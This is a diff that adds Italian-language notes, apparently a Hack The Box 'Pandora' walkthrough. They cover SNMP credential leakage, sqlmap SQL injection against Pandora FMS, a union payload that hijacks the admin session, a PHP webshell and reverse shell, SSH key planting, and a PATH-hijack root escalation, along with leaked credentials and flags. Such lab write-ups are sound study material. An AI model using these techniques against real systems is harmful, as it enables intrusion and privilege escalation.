@@ -1,0 +1,612 @@
+10.10.11.136
+
+
+
+
+
+
+
+Port 80     -----> "Play is an extension of Panda.HTB"
+
+aggiungo Panda.HTB nel file /etc/hosts
+
+c'è lo stesso sito, rilancio nmap  e lancio gobuster
+
+nmap non trova nulla di nuovo, gobuster e vhost fuzzing non trovano nulla
+
+provo burp
+niente
+
+
+
+provo udp scan con nmap 
+
+PORT    STATE SERVICE VERSION
+161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
+
+https://www.hackers-arise.com/post/2016/06/07/exploiting-snmpv1-for-reconnaissance  //smpcheck non mi funzionava
+
+snmpwalk -v 1 -c "public" 10.10.11.136 > snmpwalk.txt
+
+
+da tutte le info estratte:
+
+iso.3.6.1.2.1.1.4.0 = STRING: "Daniel"
+iso.3.6.1.2.1.1.5.0 = STRING: "pandora"
+iso.3.6.1.2.1.1.6.0 = STRING: "Mississippi"
+
+
+iso.3.6.1.2.1.25.4.2.1.5.1118 = STRING: "-u daniel -p HotelBabylon23"
+
+
+si riesce ad accedere ad ssh usando:
+
+daniel:HotelBabylon23
+
+ssh daniel@10.10.11.136
+
+
+daniel@pandora:~$ sudo -l
+[sudo] password for daniel: 
+Sorry, user daniel may not run sudo on pandora.
+
+daniel@pandora:~$ id
+uid=1001(daniel) gid=1001(daniel) groups=1001(daniel)
+
+
+non ha user flag quindi non è l'utente che devo prendere...
+ù
+daniel@pandora:~$ ls -lart /home/matt
+total 24
+-rw-r--r-- 1 matt matt  807 Feb 25  2020 .profile
+-rw-r--r-- 1 matt matt 3771 Feb 25  2020 .bashrc
+-rw-r--r-- 1 matt matt  220 Feb 25  2020 .bash_logout
+lrwxrwxrwx 1 matt matt    9 Jun 11  2021 .bash_history -> /dev/null
+drwxr-xr-x 4 root root 4096 Dec  7 14:32 ..
+drwxr-xr-x 2 matt matt 4096 Dec  7 15:00 .
+-rw-r----- 1 root matt   33 May  2 19:24 user.txt
+
+
+devo prendere utente matt
+
+cerco nel file snmp se c0è anche la sua pwd cleartext 
+non c'è
+
+
+oltre al sito che si vedeva dall'esterno (sotto /var/www/html)
+c'è un altro sito che si chiama pandora 
+
+c'è la connessione a un db (ed un container docker che viene istanziato)
+però non riesco a leggere le password da nessuna parte, forse sono nel file config.php che però non posso leggere:
+
+daniel@pandora:/var/www/pandora/pandora_console$ ls -lart ./include/config.php
+-rw------- 1 matt matt 413 Dec  3 14:06 ./include/config.php
+
+
+altre cose utili:
+
+
+
+<?php
+/**
+ * PHP script to manage Pandora FMS websockets.
+ *
+ * @category   Websocket
+ * @package    Pandora FMS
+ * @subpackage Console
+ * @version    1.0.0
+ * @license    See below
+
+
+
+https://portswigger.net/daily-swig/multiple-vulnerabilities-in-pandora-fms-could-trigger-remote-execution-attack
+
+se riesco a raggiungerlo potrei usare la sql injection
+
+
+
+daniel@pandora:/var/www/pandora/pandora_console$ cat /etc/hosts
+127.0.0.1 localhost.localdomain pandora.htb pandora.pandora.htb
+127.0.1.1 pandora
+
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+daniel@pandora:/var/www/pandora/pandora_console$ 
+
+
+
+parte solo su 127.0.0.1 (o forse 127.0.1.1)
+per raggiungerlo da kali quindi devo usare per forza port forwarding (non funziona mettendolo solo nel file /etc/hosts)
+
+
+sudo ssh -N -D 127.0.0.1:8080 daniel@10.10.11.136
+
+
+a questo punto metti proxy su firefox (tipo socks5) e vai a:
+
+
+http://localhost.localdomain/pandora_console/
+
+https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained
+
+
+
+proxychains sqlmap --url="http://localhost.localdomain/pandora_console/include/chart_generator.php?session_id=''" --dms
+
+proxychains sqlmap --url="http://localhost.localdomain/pandora_console/include/chart_generator.php?session_id=''" -D pandora --tables
+
+
++------------------------------------+
+| taddress                           |
+| taddress_agent                     |
+| tagent_access                      |
+| tagent_custom_data                 |
+| tagent_custom_fields               |
+| tagent_custom_fields_filter        |
+| tagent_module_inventory            |
+| tagent_module_log                  |
+| tagent_repository                  |
+| tagent_secondary_group             |
+| tagente                            |
+| tagente_datos                      |
+| tagente_datos_inc                  |
+| tagente_datos_inventory            |
+| tagente_datos_log4x                |
+| tagente_datos_string               |
+| tagente_estado                     |
+| tagente_modulo                     |
+| talert_actions                     |
+| talert_commands                    |
+| talert_snmp                        |
+| talert_snmp_action                 |
+| talert_special_days                |
+| talert_template_module_actions     |
+| talert_template_modules            |
+| talert_templates                   |
+| tattachment                        |
+| tautoconfig                        |
+| tautoconfig_actions                |
+| tautoconfig_rules                  |
+| tcategory                          |
+| tcluster                           |
+| tcluster_agent                     |
+| tcluster_item                      |
+| tcollection                        |
+| tconfig                            |
+| tconfig_os                         |
+| tcontainer                         |
+| tcontainer_item                    |
+| tcredential_store                  |
+| tdashboard                         |
+| tdatabase                          |
+| tdeployment_hosts                  |
+| tevent_alert                       |
+| tevent_alert_action                |
+| tevent_custom_field                |
+| tevent_extended                    |
+| tevent_filter                      |
+| tevent_response                    |
+| tevent_rule                        |
+| tevento                            |
+| textension_translate_string        |
+| tfiles_repo                        |
+| tfiles_repo_group                  |
+| tgis_data_history                  |
+| tgis_data_status                   |
+| tgis_map                           |
+| tgis_map_connection                |
+| tgis_map_has_tgis_map_con          |
+| tgis_map_layer                     |
+| tgis_map_layer_groups              |
+| tgis_map_layer_has_tagente         |
+| tgraph                             |
+| tgraph_source                      |
+| tgraph_source_template             |
+| tgraph_template                    |
+| tgroup_stat                        |
+| tgrupo                             |
+| tincidencia                        |
+| titem                              |
+| tlanguage                          |
+| tlayout                            |
+| tlayout_data                       |
+| tlayout_template                   |
+| tlayout_template_data              |
+| tlink                              |
+| tlocal_component                   |
+| tlog_graph_models                  |
+| tmap                               |
+| tmensajes                          |
+| tmetaconsole_agent                 |
+| tmetaconsole_agent_secondary_group |
+| tmetaconsole_event                 |
+| tmetaconsole_event_history         |
+| tmetaconsole_setup                 |
+| tmigration_module_queue            |
+| tmigration_queue                   |
+| tmodule                            |
+| tmodule_group                      |
+| tmodule_inventory                  |
+| tmodule_relationship               |
+| tmodule_synth                      |
+| tnetflow_filter                    |
+| tnetflow_report                    |
+| tnetflow_report_content            |
+| tnetwork_component                 |
+| tnetwork_component_group           |
+| tnetwork_map                       |
+| tnetwork_matrix                    |
+| tnetwork_profile                   |
+| tnetwork_profile_component         |
+| tnetworkmap_ent_rel_nodes          |
+| tnetworkmap_enterprise             |
+| tnetworkmap_enterprise_nodes       |
+| tnews                              |
+| tnota                              |
+| tnotification_group                |
+| tnotification_source               |
+| tnotification_source_group         |
+| tnotification_source_group_user    |
+| tnotification_source_user          |
+| tnotification_user                 |
+| torigen                            |
+| tpassword_history                  |
+| tperfil                            |
+| tphase                             |
+| tplanned_downtime                  |
+| tplanned_downtime_agents           |
+| tplanned_downtime_modules          |
+| tplugin                            |
+| tpolicies                          |
+| tpolicy_agents                     |
+| tpolicy_alerts                     |
+| tpolicy_alerts_actions             |
+| tpolicy_collections                |
+| tpolicy_groups                     |
+| tpolicy_modules                    |
+| tpolicy_modules_inventory          |
+| tpolicy_plugins                    |
+| tpolicy_queue                      |
+| tprofile_view                      |
+| tprovisioning                      |
+| tprovisioning_rules                |
+| trecon_script                      |
+| trecon_task                        |
+| trel_item                          |
+| tremote_command                    |
+| tremote_command_target             |
+| treport                            |
+| treport_content                    |
+| treport_content_item               |
+| treport_content_item_temp          |
+| treport_content_sla_com_temp       |
+| treport_content_sla_combined       |
+| treport_content_template           |
+| treport_custom_sql                 |
+| treport_template                   |
+| treset_pass                        |
+| treset_pass_history                |
+| tserver                            |
+| tserver_export                     |
+| tserver_export_data                |
+| tservice                           |
+| tservice_element                   |
+| tsesion                            |
+| tsesion_extended                   |
+| tsessions_php                      |
+| tskin                              |
+| tsnmp_filter                       |
+| ttag                               |
+| ttag_module                        |
+| ttag_policy_module                 |
+| ttipo_modulo                       |
+| ttransaction                       |
+| ttrap                              |
+| ttrap_custom_values                |
+| tupdate                            |
+| tupdate_journal                    |
+| tupdate_package                    |
+| tupdate_settings                   |
+| tuser_double_auth                  |
+| tuser_task                         |
+| tuser_task_scheduled               |
+| tusuario                           |
+| tusuario_perfil                    |
+| tvisual_console_elements_cache     |
+| twidget                            |
+| twidget_dashboard                  |
++------------------------------------+
+
+la tabella tpassword_history sembra essere interessante
+
+proxychains sqlmap --url="http://localhost.localdomain/pandora_console/include/chart_generator.php?session_id=''" -Ttpassword_history --dump
+
++---------+---------+---------------------+----------------------------------+---------------------+
+| id_pass | id_user | date_end            | password                         | date_begin          |
++---------+---------+---------------------+----------------------------------+---------------------+
+| 1       | matt    | 0000-00-00 00:00:00 | f655f807365b6dc602b31ab3d6d43acc | 2021-06-11 17:28:54 |
+| 2       | daniel  | 0000-00-00 00:00:00 | 76323c174bd49ffbbdedf678f6cc89a6 | 2021-06-17 00:11:54 |
++---------+---------+---------------------+----------------------------------+---------------------+
+
+
+provo a crackare l'hash di matt:
+
+hash-identifier f655f807365b6dc602b31ab3d6d43acc
+MD5
+
+hashcat -a 0 -m 0 hash_matt /usr/share/wordlists/rockyou.txt
+
+
+non trova nulla, non si riesce a crackare
+
+
+devo trovare altro
+
+provo a fare il dump della table tsession_php per vedere se riesco a ottenere una sessione valida e quindi autenticarmi
+
+proxychains sqlmap --url="http://localhost.localdomain/pandora_console/include/chart_generator.php?session_id=''" -T tsessions_php --dump
+
++----------------------------+-----------------------------------------------------+-------------+
+| id_session                 | data                                                | last_active |
++----------------------------+-----------------------------------------------------+-------------+
+| 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:"daniel";                            | 1638783555  |
+| 0ahul7feb1l9db7ffp8d25sjba | NULL                                                | 1638789018  |
+| 1um23if7s531kqf5da14kf5lvm | NULL                                                | 1638792211  |
+| 2e25c62vc3odbppmg6pjbf9bum | NULL                                                | 1638786129  |
+| 346uqacafar8pipuppubqet7ut | id_usuario|s:6:"daniel";                            | 1638540332  |
+| 3me2jjab4atfa5f8106iklh4fc | NULL                                                | 1638795380  |
+| 4f51mju7kcuonuqor3876n8o02 | NULL                                                | 1638786842  |
+| 4nsbidcmgfoh1gilpv8p5hpi2s | id_usuario|s:6:"daniel";                            | 1638535373  |
+| 59qae699l0971h13qmbpqahlls | NULL                                                | 1638787305  |
+| 5fihkihbip2jioll1a8mcsmp6j | NULL                                                | 1638792685  |
+| 5i352tsdh7vlohth30ve4o0air | id_usuario|s:6:"daniel";                            | 1638281946  |
+| 69gbnjrc2q42e8aqahb1l2s68n | id_usuario|s:6:"daniel";                            | 1641195617  |
+| 7ckqo2c6a8rujsvhj4gca63uib | NULL                                                | 1651526184  |
+| 81f3uet7p3esgiq02d4cjj48rc | NULL                                                | 1623957150  |
+| 8m2e6h8gmphj79r9pq497vpdre | id_usuario|s:6:"daniel";                            | 1638446321  |
+| 8upeameujo9nhki3ps0fu32cgd | NULL                                                | 1638787267  |
+| 9vv4godmdam3vsq8pu78b52em9 | id_usuario|s:6:"daniel";                            | 1638881787  |
+| a3a49kc938u7od6e6mlip1ej80 | NULL                                                | 1638795315  |
+| agfdiriggbt86ep71uvm1jbo3f | id_usuario|s:6:"daniel";                            | 1638881664  |
+| b0uk51pi96tf7qo5nfh5or3nko | id_usuario|s:6:"daniel";                            | 1651519476  |
+| cojb6rgubs18ipb35b3f6hf0vp | NULL                                                | 1638787213  |
+| d0carbrks2lvmb90ergj7jv6po | NULL                                                | 1638786277  |
+| dht2f6f68h33hqajellumue3ss | id_usuario|s:6:"daniel";                            | 1651525816  |
+| f0qisbrojp785v1dmm8cu1vkaj | id_usuario|s:6:"daniel";                            | 1641200284  |
+| fikt9p6i78no7aofn74rr71m85 | NULL                                                | 1638786504  |
+| fqd96rcv4ecuqs409n5qsleufi | NULL                                                | 1638786762  |
+| g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:"daniel";                            | 1638783230  |
+| g1o5pf30pqgp65945bkdtq2n84 | id_usuario|s:6:"daniel";                            | 1651526103  |
+| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0; | 1638796349  |
+| gf40pukfdinc63nm5lkroidde6 | NULL                                                | 1638786349  |
+| heasjj8c48ikjlvsf1uhonfesv | NULL                                                | 1638540345  |
+| hsftvg6j5m3vcmut6ln6ig8b0f | id_usuario|s:6:"daniel";                            | 1638168492  |
+| ibnejqv3ll9favc5dh60444u0b | NULL                                                | 1651526568  |
+| jecd4v8f6mlcgn4634ndfl74rd | id_usuario|s:6:"daniel";                            | 1638456173  |
+| kp90bu1mlclbaenaljem590ik3 | NULL                                                | 1638787808  |
+| lf82r3q6cckgjvl10lclhfbg9i | NULL                                                | 1651525438  |
+| ne9rt4pkqqd0aqcrr4dacbmaq3 | NULL                                                | 1638796348  |
+| o3kuq4m5t5mqv01iur63e1di58 | id_usuario|s:6:"daniel";                            | 1638540482  |
+| oi2r6rjq9v99qt8q9heu3nulon | id_usuario|s:6:"daniel";                            | 1637667827  |
+| pjp312be5p56vke9dnbqmnqeot | id_usuario|s:6:"daniel";                            | 1638168416  |
+| qq8gqbdkn8fks0dv1l9qk6j3q8 | NULL                                                | 1638787723  |
+| r097jr6k9s7k166vkvaj17na1u | NULL                                                | 1638787677  |
+| rgku3s5dj4mbr85tiefv53tdoa | id_usuario|s:6:"daniel";                            | 1638889082  |
+| u5ktk2bt6ghb7s51lka5qou4r4 | id_usuario|s:6:"daniel";                            | 1638547193  |
+| u74bvn6gop4rl21ds325q80j0e | id_usuario|s:6:"daniel";                            | 1638793297  |
++----------------------------+-----------------------------------------------------+-------------+
+
+
+
+provo ad usare questo che è di matt:
+
+g4e01qdgk36mfdh90hvcc54umq
+
+andare prima a:
+
+http://localhost.localdomain/pandora_console/include/chart_generator.php?session_id='g4e01qdgk36mfdh90hvcc54umq'
+
+
+http://localhost.localdomain/pandora_console/index.php?session_id='g4e01qdgk36mfdh90hvcc54umq'
+
+cos' accedo e sono autenticato come matt
+
+se provo ad andare a:
+
+http://localhost.localdomain/pandora_console/index.php?sec=gservers&sec2=godmode/servers/modificar_server&refr=60
+
+serve essere administrator, visto che con matt non posso accedere vuol dire che non sono amministratore
+
+
+posso provare ad usare:
+
+https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated
+
+
+non funziona bene con proxychains, non riesce a collegarsi
+
+quindi provo a farlo a mano:
+
+vado al link
+
+http://localhost.localdomain/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGO
+
+cos' riesco ad accedere come admin (infatti ottengo una pagina vuota)
+
+però non riesco comunque ad ottenere il session_id in chiaro e quindi non posso andare su altre pagine
+
+usando la web console (nella tab storage) riesco a leggero:
+
+5k3l6e05qssj6rp47fsco7qf8p
+
+per accedere come admin andare di seguito ai due link:
+
+http://localhost.localdomain/pandora_console/include/chart_generator.php?session_id=5k3l6e05qssj6rp47fsco7qf8p
+http://localhost.localdomain/pandora_console/index.php?session_id=5k3l6e05qssj6rp47fsco7qf8p
+
+
+come admin posso caricare un file:
+
+http://localhost.localdomain/pandora_console/index.php?sec=godmode/extensions&sec2=extensions/files_repo
+
+provo a caricare php_rev_shell e poi ad eseguirla
+
+
+non funziona provo a caricare una web shell ap posto della reverse shell e poi prendere la revshell da la
+
+(php_webshell.php)
+
+
+non riesco a raggiungere il file php
+
+provo con altro https://www.exploit-db.com/exploits/48064
+
+per eseguirlo mi servono user e pass di admin, non ho la pass ma posso cambiarla direttamente dall'interfaccia
+
+
+non funziona
+
+
+
+provo:
+
+
+https://www.youtube.com/watch?v=KX_jZsdgsJE
+
+
+
+http://localhost.localdomain/pandora_console/extensions/php_webshell.php            ----_> webshell
+
+
+
+
+ nc -lvnp 8081
+listening on [any] 8081 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.11.136] 33218
+Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+ 19:07:30 up 20 min,  0 users,  load average: 0.01, 0.01, 0.01
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1000(matt) gid=1000(matt) groups=1000(matt)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=1000(matt) gid=1000(matt) groups=1000(matt)
+$ 
+
+
+
+sono matt
+
+$ cat user.txt
+d7327df233f3278cd156e8a3d193f3b5
+
+
+non posso usare sudo:
+
+$ sudo -l
+sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted
+sudo: unable to initialize policy plugin
+
+evidentemente sono in un restricted environment
+
+
+
+posso usare at come suid, secondo gtfobins dovrebbe farmi uscire dal restricted environment
+
+
+non riesco ad eseguirlo correttamente (non funziona perchè non ho tty)
+non riesco nemmeno usando python, e altri comandi bash /sh per ottenre una buona shell
+
+quindi provo a collegarmi con ssh, mettendo la chiave pubblica sotto la home di matt
+
+1) ssh-keygen -f mykey  //genera id_rsa e id_rsa.pub
+2) crea directory .ssh sotto home user vittima (se non esiste già) 
+se la crei metti permessi 0700
+3) crea file /home/user/.ssh/authorized_keys se non c'è gia
+se lo crei metti permessi 0644
+4) copia chiave pubblica generata in authorized_keys
+5) cambia permessi a id_rsa (la chiave privata generata che sta sulla macchina attaccante)
+e metti 0600
+
+ssh -i ./mykey matt@10.10.11.136
+
+
+
+
+
+find / -perm -u=s -type f 2>/dev/null
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/bin/pandora_backup
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/at
+/usr/bin/fusermount
+/usr/bin/chsh
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+
+
+
+
+/usr/bin/pandora_backup          ---> sembra interessante perchè non è di default
+
+
+
+matt@pandora:/tmp$ /usr/bin/pandora_backup > out.txt
+tar: Removing leading `/' from member names
+tar: Removing leading `/' from hard link targets
+
+
+
+a quanto pare usa tar 
+
+Now attempting to backup PandoraFMS client 
+tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*
+
+si dovrebbe poter fare wildcard injection
+
+https://www.exploit-db.com/papers/33930
+
+non funziona non so per quale motivo
+
+
+l'unica cosa che mi è rimasta è fare path injection: 
+
+lo script esegue tar e lo esegue come root, visto che lo esegue senza path assoluto posso creare un file tar (che contiene solo /bin/bash o una rev shell)
+
+sotto /tmp o la home di matt e poi aggiungere la folder al path, in questo modo dovrebbe eseguire il mio tar invece di quello giusto
+
+
+matt@pandora:/tmp$ touch tar
+matt@pandora:/tmp$ echo "/bin/bash" > tar
+matt@pandora:/tmp$ chmod 777 tar
+matt@pandora:/tmp$ env | grep PATH
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+matt@pandora:/tmp$ export PATH=/tmp:$PATH
+matt@pandora:/tmp$ env | grep PATH
+PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+matt@pandora:/tmp$ pandora_backup 
+PandoraFMS Backup Utility
+Now attempting to backup PandoraFMS client
+root@pandora:/tmp# id
+uid=0(root) gid=1000(matt) groups=1000(matt)
+root@pandora:/tmp# cat /root/root.txt
+ed4748cb2a97bde2fbe24b6d0e2abcc9
+root@pandora:/tmp# 
+
+
+
+
+
+
